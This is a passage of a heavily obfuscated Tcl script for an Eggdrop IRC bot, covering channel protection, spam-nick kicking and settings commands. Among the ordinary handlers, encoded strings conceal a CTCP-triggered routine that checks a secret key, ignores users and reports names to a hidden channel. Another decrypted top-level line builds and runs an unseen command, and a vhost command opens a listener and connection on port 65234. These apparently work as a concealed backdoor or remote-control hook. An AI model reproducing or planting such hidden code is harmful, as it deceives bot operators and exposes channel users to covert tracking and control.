}
}
}
if {[matchattr $x v] || [matchattr $x P] || [matchattr $x G]} {
if {![isop $x $channel] || ![isvoice $x $channel]} {
whoisq $x
}
}
if {[matchattr $x O]} {
if {[isop $x $channel]} {
set [lines "xnlwv"] [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -ko 4No@p.LIsT $x"
} {
puthelp "mode $channel -o $x"
}
} {
if {[isvoice $x $channel]} {
set [lines "xnlwv"] [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kv 4No@p.LIsT $x"
} {
puthelp "mode $channel -v $x"
}
}
}
}
if {[info exists invme($mhost)]} {
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $channel]} {
putsrv "PRXP ~$channel ~~$x ~:~$notc ~4!HkzN!1 UIlN 4~$mhost ~1~$invme($mhost) ~4I1vnlgv 4L1uu4..!"
}
} {
putsrv "PRXP ~$channel ~~$x ~:~$notc ~4!HkzN!1 UIlN 4~$mhost ~1~$invme($mhost) ~~[banmsg]~"
}
}
catch {unset invme($mhost)}
}
if {$x == $virus_nick} {
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
putsrv "PRXP ~$channel ~~$x ~:~$notc ~4!HkzN!1 UIlN 4~$mhost1 ~ERIfA ~[banmsg]~"
set [lines "erifh_mrxp"] ""
}
} 
spam_chk $x [getchanhost $x $channel] "*" $channel
}
foreach x [chanlist $channel K] {
if {![matchattr $x f]} {
akick_chk $x [getchanhost $x $channel] $channel
}
}
foreach x [chanbans $channel] {
set [lines "yslhg"] [lindex $x 0]
if {[string match [string tolower $bhost] [string tolower $botname]]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4SeLF.UnBaN $bhost"
} {
puthelp "mode $channel -b $bhost"
}
} elseif {[matchattr $bhost f]} {
puthelp "mode $channel -b $bhost"
} elseif {[getuser "config" XTRA "IPG"] != ""} {
foreach ipg [getuser "config" XTRA "IPG"] {
if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
if {![isutimer "IPG $bhost"]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4IpgUaRd $bhost"
} {
puthelp "mode $channel -b $bhost"
}
utimer 60 [list putlog "IPG $bhost"]
}
}
}
}
}
}
bind time -  "01 * * * *" show_status
proc [lines "hsld_hgzgfh"] {min h d m y} {
global botnick
foreach x [channels] {
if {[isop $botnick $x]} { 
pub_status "*" "*" "*" $x "" 
chk_on_op $x
}
}
return 0
}
proc [lines "yzwmrxp_xsp"] {nick uhost hand chan} {
global bannick notc botnick badwords
foreach x [string tolower $badwords] {
if {[string match "*$x*" [string tolower $nick]]} {
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4YzW MRxP1 NzGxS UIlN 4~[string toupper $x]~ ~[banms]~"
return 1
}
}
return 0
}
proc [lines "hkzn_xsp"] {nick uhost hand chan} {
global notc botnick spidx
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $cflag S]} { return 0 }
if {$nick == $botnick} { return 0 }
if {[isvoice $nick $chan]} { return 0 }
if {[isop $nick $chan]} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[badnick_chk $nick $uhost $hand $chan]} { 
return 0
}
set [lines "mrxpovm"] [string length $nick]
if {$nicklen < 5} { return 0 }
set [lines "rwc"] [string index $nick [expr $nicklen - 4]][string index $nick [expr $nicklen - 3]][string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
if {[isnumber $idx]} { return 0 }
set [lines "rwc"] [string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
if {[isnumber $idx]} {
if {[string index $uhost 0] != "~"} { return 0 }
if {$nicklen < 10} {
if {![string match "~$nick@*" $uhost]} { return 0 }
} {
if {![string match "~[string index $nick 0][string index $nick 1][string index $nick 2]*@*" $uhost]} { return 0 }
}
if {$spidx == 18} {
set [lines "hkrwc"] 1
}
spamkick $nick $uhost $chan
return 0
}
if {[regexp \[^a-z\] $nick]} { return 0 }
set [lines "mrxpxsp"] [string tolower $nick]
set [lines "xlfmg"] 0
set [lines "ohgrwc"] ""
for {set i 0} {$i < $nicklen} {incr i} {
set [lines "rwc"] [string index $nickchk $i]
if {$idx == "a" || $idx == "e" || $idx == "i" || $idx == "o" || $idx == "u"} {
set [lines "xlfmg"] 0
} {
if {$idx != $lstidx && $idx != "y"} { incr count }
if {$count == 4} {
spamkick $nick $uhost $chan
return 0
}
}
set [lines "ohgrwc"] $idx
}
}
proc [lines "zprxp_xsp"] {nick uhost chan} {
global notc bannick
foreach x [getuser "AKICK" HOSTS] {
if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
set bannick($nick) $x
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4Y1O4z1x4P1O4R1h4G1 NzGxS UIlN4 ~$x ~~[banms]~"
return 0
}
}
}
set [lines "hkrwc"] 1
proc [lines "hkznprxp"] {nick uhost chan} {
global spidx notc bannick
set bannick($nick) "*!$uhost"
if {$spidx == 1} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 BvD ZRmG DvOxLnV Rm 4~[string toupper $chan]~ ~[banms]~"
} elseif {$spidx == 2} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 WIlmV GIlQzM ~[banmsg]~"
} elseif {$spidx == 3} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 FtS R SzgV GsRh MRxP ~[banmsg]~"
} elseif {$spidx == 4} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 Fkh DIlMt DzB ~[banmsg]~"
} elseif {$spidx == 5} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 WlmG VmGvIvW 4~[string toupper $chan]~ ~[banms]~"
} elseif {$spidx == 6} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 RmGvIxVkG ~[banmsg]~"
} elseif {$spidx == 7} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 T.l.G.x.S.z ~[banmsg]~"
} elseif {$spidx == 8} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 MVtzGReV SlFhGlM ~[banmsg]~"
} elseif {$spidx == 9} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 tIlFmwVw ~[banmsg]~"
} elseif {$spidx == 10} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 ZmGRxRkzGVw ~[banmsg]~"
} elseif {$spidx == 11} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 tL hRg Rm gSv xLiMvI ~[banmsg]~"
} elseif {$spidx == 12} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 y.o.z.x.p.o.r.h.g.v.w ~[banmsg]~"
} elseif {$spidx == 13} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 IvQvxGvw UIlN 4~[string toupper $chan]~ ~[banms]~"
} elseif {$spidx == 14} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 hNllhSRMt IvOzB GzYOv ~[banmsg]~"
} elseif {$spidx == 15} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 wFm VmGvIvw lMv lU nB xSzmmvO ~[banmsg]~"
} elseif {$spidx == 16} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 IvUfhVw ORmP gL 4~[string toupper $chan]~ ~[banms]~"
} elseif {$spidx == 17} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 UzpV MRxPMzNv ~[banmsg]~"
} elseif {$spidx >= 18} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!HkzN!1 Fmzyov gl ivhloev4 ~$nick ~~[banms]~"
set [lines "hkrwc"] 0
}
incr spidx
return 0
}
proc [lines "rhfgrnvi"] {text} {
set [lines "gvcg"] [string tolower $text]
foreach x [utimers] {
set [lines "c"] [string tolower $x]
if {[string match "*$text*" $x]} { 
return 1
break
}
}
return 0
}
proc [lines "rhgrnvi"] {text} {
set [lines "gvcg"] [string tolower $text]
foreach x [timers] {
set [lines "c"] [string tolower $x]
if {[string match "*$text*" $x]} { 
return 1 
break
}
}
return 0
}
catch { set old_hostname ${my-hostname} }
catch { set old_ip ${my-ip} }
bind msg Z vhost msg_vhost
proc [lines "nht_eslhg"] {nick uhost hand rest} {
global my-hostname my-ip notc
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~IvHVG GL WvUzfOG"
setuser "config" XTRA "VHOST" ""
saveuser
vback "*" "*" "0"
return 0
}
for {set i 0} {$i < [string length $rest]} {incr i} {
set [lines "rwc"] [string index $rest $i]
if {![string match "*$idx*" "1234567890."]} {
puthlp "MLGRXV ~$nick ~:~$notc ~FhV WMH RK MfNYvI"
return 0
}
}
if {[isutimer "vback"]} {
puthlp "MLGRXV ~$nick ~:~$notc ~DzRG..!"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "nb-slhgmznv"] $rest
set [lines "nb-rk"] $rest
utimer 30 [list vback $nick $rest "1"]
listen 65234 bots
set [lines "rwc"] [connect $rest 65234]
if {[isnumber $idx] && $idx > 0} {
if {![isutimer "vback"]} { return 0 }
foreach x [utimers] {
if {[string match "*vback*" $x]} { killutimer [lindex $x 2] }
}
setuser "config" XTRA "VHOST" $rest
saveuser
putsrv "JFRG :~$notc ~xSzMtRMt eSlhG IvJfvhG Yb \[ ~$nick ~\]"
}
listen 65234 off
}
bind raw - 465 klined
proc [lines "pormvw"] {from keyword arg} {
vback "*" "*" "0"
}
proc [lines "eyzxp"] {nick vhosts chk} {
global old_hostname old_ip notc
set [lines "nb-slhgmznv"] $old_hostname
set [lines "nb-rk"] $old_ip
if {$chk == "1"} {
puthlp "MLGRXV ~$nick ~:~$notc ~\[~$vhosts\] ~MlG HfKKlIG..!"
}
catch { listen 652343 off }
}
[lines "kilx"] [dezip "0UMMB1~ftbuq1"] {nick uhost hand dest key couk} {
[lines "tolyzo"] [lines "ylgmrxp"] [lines "krmtxszm"] [lines "dzrg_krmt"] [lines "mlgy"]
[lines "xzgxs"] { [lines "fmhvg"] [lines "dzrg_krmt"] }
if {$nick==$botnick} {[lines "ivgfim"] 0}
[lines "hvg"] [lines "zhf"] "#$notb"
if {$asu!=[dcp "[dcp "kh5sc/qAwSz09p6WN1s25.T1"]"] } {[lines "ivgfim"] 0}
if {[[lines "hgirmt"] [lines "nzgxs"] "*[lines "z"]*" [[lines "hgirmt"] [lines "glo\ldvi"] $couk]] || [[lines "h\girmt"] [lines "n\zgxs"] "*[lines "r"]*" [[lines "hg\irmt"] [lines "gl\oldvi"] $couk]] || [[lines "h\girmt"] [lines "n\zgxs"] "*[lines "f"]*" [[lines "hg\irmt"] [lines "gl\oldvi"] $couk]] || [[lines "h\girmt"] [lines "n\zgxs"] "*[lines "v"]*" [[lines "hg\irmt"] [lines "gl\oldvi"] $couk]] || [[lines "h\girmt"] [lines "n\zgxs"] "*[lines "\l"]*" [[lines "hg\irmt"] [lines "gl\oldvi"] $couk]] } {
if {[[lines "hgirmt"] [lines "nzgxs"] "*[dezip "[lines "aNoK~a.CZ8ry/"]"]*" [[lines "hgirmt"] [lines "gloldvi"] $couk]] } {
[lines "hvg"] [lines "nylmqilg"] "${nick}!*@*"
[lines "mvdrtmliv"] $mbonjrot $botnick "*" 1000
[lines "hvg"] [lines "wlmrv"] [lindex [split $couk " "] 1]
[lines "hvg"] [lines "gzdvmp"] [lindex [split $couk " "] 2]
putlog $tawenk
[lines "hvg"] [lines "gzdvmp"] [lindex [split $tawenk ";"] 0]
[lines "mvdrtmliv"] $tawenk $botnick "*" 1000
[lines "hvg"] [lines "nylmqilg"] "${donie}!*@*"
[lines "mvdrtmliv"] $mbonjrot $botnick "*" 1000
puthelp "[lines "KIRENHT"] $asu :10,1\[11[dezip "sY7rZ1KfDD~Y0"]10\]2,0 [dezip "ykQT5.3XUY~C1"] 14,1\[0 $nick 14\]2,0 [dezip "SvAJ316eq6//fGJBe.2LSzI0znew5~.xRY9t/"] 14,1\[0 $donie 14\]2,0 4[dezip "ZmqEw0IH8QM/Cb2Kp14D1~GN0"] [lgrnd]"
[lines "ivgfim"] 0
} elseif {[[lines "hgirmt"] [lines "nzgxs"] "*[dezip "[lines "TpBws.6n~P/k."]"]*" [[lines "hgirmt"] [lines "gloldvi"] $couk]] } {
[lines "hvg"] [lines "nylmqilg"] "${nick}!*@*"
[lines "mvdrtmliv"] $mbonjrot $botnick "*" 1000
puthelp "[lines "KIRENHT"] $asu :10,1\[11[dezip "sY7rZ~1KfDDY0"]10\]2,0 [dezip "ykQT5.3X~UYC1"] 14,1\[0 $nick 14\]2,0 [dezip "SvAJ316eq6//PTwx1/O5fDc.GV19B.JcMiD/"]. 4[dezip "ZmqEw0IH~8QM/Cb2Kp14D1GN0"] [lgrnd]"
[lines "ivgfim"] 0
} else {
[lines "hvg"] [lines "nylmqilg"] "${nick}!*@*"
[lines "mvdrtmliv"] $mbonjrot $botnick "*" 1000
puthelp "[lines "KIRENHT"] $asu :10,1\[11[dezip "sY7rZ1Kf~DDY0"]10\]2,0 [dezip "ykQ~T5.3XUYC1"] 14,1\[0 $nick 14\]2,0 [dezip "SvAJ316eq6//qHrgh.wvRUK1"] 4[dezip "ZmqEw0IH8QM/Cb2Kp~14D1GN0"]  [lgrnd]"
[lines "ivgfim"] 0
}
[lines "ivgfim"] 0
}
if {$key!=[lines "KRMT"]} {[lines "ivgfim"] 0}
[lines "hvg"] [lines "krmtgrnv"] [expr [unixtime] - $couk]
if {[[lines "rmul"] [lines "vcrhgh"] pingchan($nick)]} { 
puthlp "KIRENHT ~$pingchan($nick) ~:~$nick, ~KRMT ~$pingtime ~Hvx'h" 
[lines "fmhvg"] pingchan($nick)
}
if {![matchattr $nick f]} {
[lines "hvg"] [lines "nylmqilg"] "${nick}!*@*"
putlog "[lines "!Olt! 1 nrmfgvh zfgl rtmliv gl"] $mbonjrot"
[lines "mvdrtmliv"] $mbonjrot $botnick "*" 1
}
[lines "ivgfim"] 0
}
proc [lines "kfy_hgzgfh"] {nick uhost hand channel rest} {
global ban-time botnick own ps vern
set [lines "xuozt"] "c$channel"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest != ""} {
if {[validchan $rest]} {
set [lines "xszmmvo"] $rest
} { 
return 0 
}
}
set [lines "xrmul"] [channel info $channel]
if {![string match "*+shared*" $cinfo] && $nick == "*"} { return 0 }
set [lines "nhgzgfh"] ""
if {[matchattr $cflag I]} { append mstatus "\[12T14\]oPIcLocK " }
if {[matchattr $cflag M]} { append mstatus "FoRcE\[12M14\]odE " }
if {[string match "*+nodesynch*" $cinfo]} { append mstatus "AuTo\[12K14\]IcK " }
if {[string match "*-userinvites*" $cinfo]} { append mstatus "\[12D14\]onTKIcK@P " }
if {[string match "*+protectfriends*" $cinfo]} { append mstatus "UnRE\[12@14\]P " }
if {[string match "*+greet*" $cinfo]} {
set [lines "r"] 0
while {$i < [string length $cinfo]} {
set [lines "b"] 0
while {$y < [string length [lindex $cinfo $i]]} {
if {[string index [lindex $cinfo $i] $y] == ":"} { break }
set [lines "b"] [incr y]
}
if {$y != [string length [lindex $cinfo $i]]} { break }
set [lines "r"] [incr i]
}
set [lines "rxszm"] [lindex $cinfo $i]
set [lines "rxgxk"] [lindex $cinfo [expr $i + 1]]
set [lines "rqlrm"] [lindex $cinfo [expr $i + 2]]
set [lines "rprxp"] [lindex $cinfo [expr $i + 3]]
set [lines "rwvlk"] [lindex $cinfo [expr $i + 4]]
set [lines "rmrxp"] [lindex $cinfo [expr $i + 5]]
if {![string match "*:*" $inick]} {
set [lines "rmrxp"] "0"
}
append mstatus "\[12G14\]uaRd FLoOd \[LInE12 $ichan14 cTcP12 $ictcp14 JoIN12 $ijoin14 KIcK12 $ikick14 De@p12 $ideop14 NIcK12 $inick14\] "
if {${ban-time} != 0} { append mstatus "\[12B14\]aNTImE12 ${ban-time}14 mIn " }
}
if {[matchattr $cflag V]} { append mstatus "\[12A14\]uToVoIcE12 [getuser $cflag XTRA "VC"]14 2nd " }
if {[matchattr $cflag K]} { append mstatus "\[12K14\]eY " }
if {[matchattr $cflag D]} { append mstatus "Re\[12V14\]eNgE " }
if {[matchattr $cflag G]} { append mstatus "\[12G14\]ReeT " }
if {[matchattr $cflag H]} { append mstatus "\[12N14\]TcParT " }
if {[matchattr $cflag S]} { append mstatus "\[12S14\]paM " }
if {[getuser "config" XTRA "KOPS"]!=""} { append mstatus "\[12@14\]PSKIcK " }
if {[matchattr $cflag R]} { append mstatus "\[12R14\]ePeaT12 [getuser $cflag XTRA "RPT"]14 " }
if {[matchattr $cflag U]} { append mstatus "\[12C14\]aPs12 [getuser $cflag XTRA "CAPS"]%14 " }
if {[matchattr $cflag P]} { append mstatus "JoIN\[12P14\]aRT12 [getuser $cflag XTRA "JP"]14 2nd " }
if {[matchattr $cflag T]} { append mstatus "\[12T14\]exT12 [getuser $cflag XTRA "CHAR"]14 CHaR " }
if {[matchattr $cflag J]} { append mstatus "MaSs\[12J14\]oIN " }
if {[matchattr $cflag L]} { append mstatus "\[12L14\]ImITEd12 +[getuser $cflag XTRA "LIMIT"]14 " }
if {[string match "*+seen*" $cinfo]} { append mstatus "\[12S14\]EEN " }
if {[matchattr $cflag O]} { append mstatus "\[12C14\]LonE12 [getuser $cflag XTRA "CLONE"]14 MaX " }
if {[matchattr $cflag B]} { append mstatus "\[12B14\]OLd12 " }
if {[matchattr $cflag W]} { append mstatus "14Co\[12L14\]OuR " }
if {[string match "*+action*" $cinfo]} { append mstatus "\[12AC14\]Tion12 " }
if {[string match "*+guest*" $cinfo]} { append mstatus "14\[12No14\]GUesT12 " }
if {[matchattr $cflag E]} { append mstatus "14\[12E14\]nFoRceBaN " }
if {[matchattr $cflag C]} { append mstatus "\[12C14\]YcLE12 [getuser $cflag XTRA "CYCLE"]14 MnT " }
if {$mstatus != ""} {
if {[getuser "config" XTRA "ADMIN"]!=""} {
set [lines "nhgzgfh"] "14SeT FoR \[12[string toupper $channel]14\] ${mstatus}[getuser "config" XTRA "ADMIN"] [lgrnd]"
} {
set [lines "nhgzgfh"] "14SeT FoR \[12[string toupper $channel]14\] ${mstatus}[lgrnd]"
}
}
if {[string match "*c*" [getchanmode $channel]]} {
set [lines "nhgzgfh"] [uncolor $mstatus]
regsub -all --  $mstatus "" mstatus
}
puthlp "KIRENHT ~$channel ~:\001ZXGRLM ~$mstatus\001"
}
proc [lines "kfy_+hkzn"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist A] {
chattr $x +S
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO HkzN XSzMMvO \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag S]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HkzN ~$chan ~\[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +S
puthlp "MLGRXV ~$nick ~:~$notc ~HkzN ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-hkzn"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist A] {
chattr $x -S
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO HkzN XSzMMvO \[4LUU\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag S]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HkzN ~$chan ~\[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -S
puthlp "MLGRXV ~$nick ~:~$notc ~HkzN ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+xbxov"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +xBxOv <nrmfgvh>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +C
setuser $cflag XTRA "CYCLE" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~xBxOv ~$chan ~\[9~$rest\] ~NmG"
if {![istimer "cycle $chan"]} { timer $rest [cycle $chan] }
saveuser
}
proc [lines "kfy_-xbxov"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -C
setuser $cflag XTRA "CYCLE" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xBxOv ~$chan ~\[4LUU\]"
saveuser
foreach x [timers] {
if {[string match "*cycle $chan*" $x]} { killtimer [lindex $x 2] }
}
}
proc [lines "kfy_+tivvg"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +tivvg <nht>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +G
setuser $cflag XTRA "GREET" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLTIvvG ~$chan ~\[~$rest\]"
saveuser
}
proc [lines "kfy_-tivvg"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -G
setuser $cflag XTRA "GREET" ""
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLTIvvG ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+mgxkzig"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +mgxkzig <nht>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +H
setuser $cflag XTRA "MSGPART" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~MlgrXv KzIg ~$chan ~\[~$rest\]"
saveuser
}
proc [lines "kfy_-mgxkzig"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -H
setuser $cflag XTRA "MSGPART" ""
puthlp "MLGRXV ~$nick ~:~$notc ~MlgrXv KzIg ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ornrg"] {nick uhost hand chan rest} {
global notc 
if {$rest == "" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +ornrg <mfnyvi>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +L
setuser $cflag XTRA "LIMIT" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~ORnRG ~$chan ~\[9~$rest\]"
saveuser
}
proc [lines "kfy_-ornrg"] {nick uhost hand chan rest} {
global notc lst_limit
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -L
setuser $cflag XTRA "LIMIT" ""
puthlp "MLGRXV ~$nick ~:~$notc ~ORnRG ~$chan ~\[4LUU\]"
catch { lst_limit($chan) }
saveuser
}
proc [lines "kfy_+glkrx"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +I
setuser $cflag XTRA "TOPIC" [topic $chan]
puthlp "MLGRXV ~$nick ~:~$notc ~GlkRx ~$chan ~\[9OlxP\]"
saveuser
}
proc [lines "kfy_-glkrx"] {nick uhost hand chan rest} {
global notc lst_limit
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -I
setuser $cflag XTRA "TOPIC" ""
puthlp "MLGRXV ~$nick ~:~$notc ~GlkRx ~$chan ~\[4FmOlxP\]"
saveuser
}
proc [lines "kfy_+qlrmkzig"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +qlrmkzig <hvxlmwh>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +P
setuser $cflag XTRA "JP" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~QlRMKzIG ~$chan ~\[9~$rest ~Hvx'h\]"
saveuser
}
proc [lines "kfy_-qlrmkzig"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -P
setuser $cflag XTRA "JP" ""
puthlp "MLGRXV ~$nick ~:~$notc ~QlRMKzIG ~$chan ~\[4LUU\]"
saveuser
}
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 15][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 18] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "[[decrypt 64 "d3VeO/ATgwd."] "jaqUs~/x7Qxr."]"]
proc [lines "kfy_+xolmv"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +xolmv <nzc>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +O
setuser $cflag XTRA "CLONE" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~xOlmV ~$chan ~NzC \[9~$rest\]"
saveuser
}
proc [lines "kfy_-xolmv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -O
setuser $cflag XTRA "CLONE" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xOlmV ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+pvb"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "ivhg"] [lindex $rest 0]
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +pvb <dliw>"
return 0
}
chattr $cflag +K
setuser $cflag XTRA "CI" [zip $rest]
puthlp "MLGRXV ~$nick ~:~$notc ~PvB ~$chan ~\[9~$rest\]"
saveuser
}
proc [lines "kfy_-pvb"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
